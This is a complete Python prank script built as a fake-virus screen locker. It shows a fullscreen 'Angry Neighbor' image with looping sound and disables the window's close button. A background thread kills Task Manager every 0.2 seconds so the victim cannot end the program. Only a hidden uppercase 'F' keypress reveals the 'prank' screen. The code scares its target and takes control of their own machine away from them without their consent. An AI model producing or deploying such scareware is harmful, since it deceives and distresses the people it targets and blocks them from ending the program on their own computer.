import tkinter as tk
from PIL import Image, ImageTk
import threading
import psutil
import pygame
import ctypes
import time

# Initialize Pygame for sound
pygame.init()

# Paths to image and sound files
ANGRY_IMAGE_PATH = "angry_neighbor_image.png"
PRANK_IMAGE_PATH = "prank_image.png"
SOUND_PATH = "BEX.mp3"

# Flag to control Task Manager monitoring
monitor_task_manager_flag = True

# Function to monitor and close Task Manager if opened
def monitor_task_manager():
    while monitor_task_manager_flag:
        for process in psutil.process_iter(['name']):
            if process.info['name'] and 'Taskmgr.exe' in process.info['name']:
                process.kill()  # Close Task Manager immediately
        time.sleep(0.2)

# Function to show the prank screen
def show_prank():
    global monitor_task_manager_flag
    
    # Stop Task Manager monitoring
    monitor_task_manager_flag = False

    # Stop sound
    pygame.mixer.music.stop()

    # Display prank image
    prank_image = Image.open(PRANK_IMAGE_PATH)
    prank_image = prank_image.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.Resampling.LANCZOS)  # Resize to full screen
    prank_photo = ImageTk.PhotoImage(prank_image)
    label.config(image=prank_photo)
    label.image = prank_photo
    root.attributes("-fullscreen", False)  # Exit fullscreen mode
    root.update()
    root.title("PRANK LOL PRANK YOU GOT PRANKED")

# Function to show the "virus" screen
def show_virus():
    global monitor_task_manager_flag

    # Start Task Manager monitoring
    monitor_task_manager_flag = True
    threading.Thread(target=monitor_task_manager, daemon=True).start()

    # Play sound in loop
    pygame.mixer.music.load(SOUND_PATH)
    pygame.mixer.music.play(-1)

    # Load and display angry neighbor image
    angry_image = Image.open(ANGRY_IMAGE_PATH)
    angry_image = angry_image.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.Resampling.LANCZOS)  # Resize to full screen
    angry_photo = ImageTk.PhotoImage(angry_image)
    label.config(image=angry_photo)
    label.image = angry_photo
    root.attributes("-fullscreen", True)  # Make window fullscreen
    root.title("Angry Neighbor")

# Function to handle the F key press
def on_key_press(event):
    if event.keysym == "F":
        show_prank()

# Set up the main window
root = tk.Tk()
root.configure(bg="black")
root.bind("<KeyPress>", on_key_press)
root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable window close button

# Label for displaying images
label = tk.Label(root, bg="black")
label.pack(expand=True)

# Start the prank
show_virus()
root.mainloop()
